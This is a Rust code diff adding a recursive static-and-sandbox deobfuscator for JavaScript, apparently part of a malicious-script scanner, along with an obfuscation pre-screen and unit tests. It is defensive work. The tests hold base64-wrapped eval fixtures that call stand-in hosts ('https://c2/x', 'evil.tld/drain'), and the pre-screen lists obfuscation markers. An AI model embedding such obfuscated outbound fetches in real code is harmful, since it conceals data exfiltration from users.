@@ -242,6 +242,103 @@ fn quote_js(s: &str) -> String {
     out
 }
 
+// ── Tier-2 driver: recursive static + dynamic deobfuscation ─────────────────────
+
+use super::runtime::{run_deobfuscation_sandbox, SandboxLimits};
+use std::time::Instant;
+
+/// Recursion budgets (defence against deobfuscation bombs).
+const MAX_DEPTH: usize = 3;
+const MAX_TOTAL_PAYLOAD_BYTES: usize = 2 * 1024 * 1024;
+const MAX_PAYLOADS: usize = 64;
+/// Captured strings shorter than this are noise (single tokens, empty decodes).
+const MIN_PAYLOAD_LEN: usize = 8;
+
+/// One payload recovered by dynamic deobfuscation.
+#[derive(Debug, Clone)]
+pub struct DeepPayload {
+    /// Which sink yielded it (`eval`, `Function`, `document.write`, …).
+    pub sink: String,
+    /// Recursion layer it was recovered at (1 = first pass).
+    pub layer: usize,
+    /// The recovered code/string, after a Tier-0 fold pass.
+    pub code: String,
+}
+
+/// Cheap pre-screen: only worth spinning up the (heavier) sandbox when the script
+/// shows dynamic-code / obfuscation markers. Clean code skips deep deobfuscation.
+pub fn looks_obfuscated(s: &str) -> bool {
+    s.contains("eval(")
+        || s.contains("Function(")
+        || s.contains("atob(")
+        || s.contains("unescape(")
+        || s.contains("decodeURIComponent(")
+        || s.contains("document.write")
+        || s.contains("fromCharCode")
+        || s.contains("\\x")
+        || s.matches("_0x").count() > 2
+}
+
+/// Recursive (Tier-0 + Tier-2) deobfuscation to a bounded fixpoint.
+///
+/// Static folding (`normalize`) peels constant layers; the sink-capture sandbox
+/// runs the script's own decoder and captures whatever it tries to
+/// `eval`/`Function`/`document.write`/decode. Each captured payload is folded and
+/// re-fed (up to `MAX_DEPTH`) so nested obfuscation unrolls one layer per round.
+/// Bounded by depth, total payload bytes, payload count and a wall-clock deadline.
+pub fn deobfuscate_deep(source: &str, limits: &SandboxLimits, deadline: Instant) -> Vec<DeepPayload> {
+    let mut out: Vec<DeepPayload> = Vec::new();
+    let mut seen: std::collections::HashSet<u64> = std::collections::HashSet::new();
+    let mut total = 0usize;
+    let mut frontier: Vec<String> = vec![normalize(source).normalized];
+    let mut depth = 0usize;
+
+    while !frontier.is_empty()
+        && depth < MAX_DEPTH
+        && total < MAX_TOTAL_PAYLOAD_BYTES
+        && out.len() < MAX_PAYLOADS
+        && Instant::now() < deadline
+    {
+        let mut next: Vec<String> = Vec::new();
+        for s in &frontier {
+            if Instant::now() >= deadline {
+                break;
+            }
+            for (sink, payload) in run_deobfuscation_sandbox(s, limits).captured {
+                if payload.len() < MIN_PAYLOAD_LEN {
+                    continue;
+                }
+                let folded = normalize(&payload).normalized;
+                if !seen.insert(fnv1a(&folded)) {
+                    continue; // dedup identical payloads across layers
+                }
+                total += folded.len();
+                if total > MAX_TOTAL_PAYLOAD_BYTES {
+                    break;
+                }
+                out.push(DeepPayload { sink, layer: depth + 1, code: folded.clone() });
+                if out.len() >= MAX_PAYLOADS {
+                    break;
+                }
+                next.push(folded); // recurse on this layer
+            }
+        }
+        frontier = next;
+        depth += 1;
+    }
+    out
+}
+
+/// Stable FNV-1a hash for payload dedup.
+fn fnv1a(s: &str) -> u64 {
+    let mut h: u64 = 0xcbf2_9ce4_8422_2325;
+    for b in s.as_bytes() {
+        h ^= *b as u64;
+        h = h.wrapping_mul(0x0000_0100_0000_01b3);
+    }
+    h
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
@@ -322,5 +419,62 @@ mod tests {
     #[test]
     fn quote_escapes_specials() {
         assert_eq!(quote_js("a\"b\\c\n"), r#""a\"b\\c\n""#);
+    }
+}
+
+#[cfg(test)]
+mod deep_tests {
+    use super::*;
+    use base64::Engine;
+    use std::time::Duration;
+
+    fn b64(s: &str) -> String {
+        base64::engine::general_purpose::STANDARD.encode(s)
+    }
+
+    fn limits() -> SandboxLimits {
+        SandboxLimits {
+            max_memory: 64 * 1024 * 1024,
+            max_duration: Duration::from_secs(3),
+            max_scripts: 20,
+        }
+    }
+
+    #[test]
+    fn deep_recovers_single_layer() {
+        let src = format!(r#"eval(atob("{}"));"#, b64("fetch('https://c2/x')"));
+        let payloads = deobfuscate_deep(&src, &limits(), Instant::now() + Duration::from_secs(8));
+        assert!(payloads.iter().any(|p| p.code.contains("fetch('https://c2/x')")),
+            "payloads: {:?}", payloads);
+    }
+
+    #[test]
+    fn deep_unrolls_nested_layers() {
+        // outer eval(atob(layer1)) where layer1 = eval(atob(inner)); inner = fetch(...)
+        let inner = "fetch('https://evil.tld/drain')";
+        let layer1 = format!(r#"eval(atob("{}"))"#, b64(inner));
+        let outer = format!(r#"eval(atob("{}"))"#, b64(&layer1));
+        let payloads = deobfuscate_deep(&outer, &limits(), Instant::now() + Duration::from_secs(8));
+        assert!(payloads.iter().any(|p| p.code.contains("evil.tld")),
+            "expected inner payload recovered; got: {:?}", payloads);
+        assert!(payloads.iter().any(|p| p.layer >= 2),
+            "expected a layer>=2 payload; got: {:?}", payloads);
+    }
+
+    #[test]
+    fn deep_on_clean_code_yields_nothing() {
+        let payloads = deobfuscate_deep(
+            "function add(a,b){return a+b;} add(1,2);",
+            &limits(),
+            Instant::now() + Duration::from_secs(5),
+        );
+        assert!(payloads.is_empty(), "clean code should yield no payloads: {:?}", payloads);
+    }
+
+    #[test]
+    fn prescreen_flags_obfuscation_only() {
+        assert!(looks_obfuscated(r#"eval(atob("x"))"#));
+        assert!(looks_obfuscated("String.fromCharCode(104,105)"));
+        assert!(!looks_obfuscated("function add(a,b){return a+b;}"));
     }
 }
